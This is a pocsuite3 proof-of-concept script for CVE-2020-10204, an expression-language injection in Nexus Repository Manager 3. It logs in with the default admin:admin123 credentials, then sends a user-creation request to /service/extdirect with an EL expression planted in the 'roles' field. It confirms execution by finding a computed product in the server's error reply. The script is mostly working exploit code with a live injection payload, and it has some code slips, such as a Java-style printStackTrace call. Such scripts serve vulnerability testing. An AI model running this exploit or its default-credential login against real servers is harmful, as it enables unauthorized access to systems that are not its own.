#!/usr/bin/env python
#coding=utf-8

import random
import json
import base64

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
CVE-2020-10204: Nexus 3 EL injection
Admin access is required
'''
class Nexus3_2020_10204_EL_INJECTION_POC(POCBase):
    vulID = 'Nexus3-CVE-2020-10204'
    appName = 'Nexus3'
    appVersion = 'Nexus Repository Manager OSS/Pro <=3.21.1'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2020-04-01'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-03'  # 编写 PoC 的日期
    updateDate = '2020-04-03'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31']  # 漏洞地址来源,0day不用写
    name = 'Nexus3 EL injection'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危"

    
    # 使用随机字符串作为banner，计算数字之后返回
    ran1 = random.randint(1,100)

    ran2 = random.randint(100,200)
    
    ran_sum = ran1 * ran2

    http_proxy  = "http://192.168.85.1:8087"
    https_proxy = "http://192.168.85.1:8087"
    proxies = {"http": http_proxy, "https": https_proxy}


    def _verify(self):
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/service/extdirect"

        j = {
                "action":"coreui_User",
                "method":"create",
                "data": [
                    {
                        "userId": "shadowsock5",
                        "firstName": "77",
                        "lastName": "ss",
                        "password": "password",
                        "email": "77@qq.com",
                        "status": "active",
                        "roles": [
                            "$\\A" + "{" + str(self.ran1) + "*" + str(self.ran2) + "}"
                        ]
                    }
                ],
            "type":"rpc","tid":4}
        
        try:
            self.headers.update(self.auth())
            print(self.headers)
            resp = req.post(target_url, json=j, headers=self.headers, proxies=self.proxies)
        except Exception as e:
            e.printStackTrace()
        

        if self.test_EL(resp):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = target_url
            return self.save_output(result)
        return self.save_output(result)



    def auth(self):
        user = "admin"
        password = "admin123"
        tmp = user + ':' + password
        auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
        headers = {'Authorization': 'Basic'+' '+auth}
        return headers



    # 验证EL表达式被执行
    def test_EL(self, p_resp):
        d = p_resp.json()
        result = d['result']['errors']['roles']
        print(result)
        print(self.ran_sum)
        try:
            if str(self.ran_sum) in result:
                return True
        except Exception:
            return False            

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Nexus3_2020_10204_EL_INJECTION_POC)
